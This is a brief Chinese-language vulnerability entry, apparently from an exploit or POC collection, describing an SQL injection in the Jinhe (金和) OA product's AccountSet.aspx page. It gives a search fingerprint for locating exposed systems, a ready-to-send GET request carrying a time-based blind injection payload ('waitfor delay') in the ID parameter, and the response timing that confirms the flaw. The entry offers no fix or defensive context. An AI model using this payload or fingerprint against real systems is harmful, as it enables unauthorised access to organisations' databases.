# 金和OAAccountSet.aspx存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /c6/JHSoft.Web.CostControl/subClass/AccountSet.aspx/?ID=1'waitfor delay '0:0:4--&OperType=Edit HTTP/1.1`
- **响应特征**：200 响应时间>=4s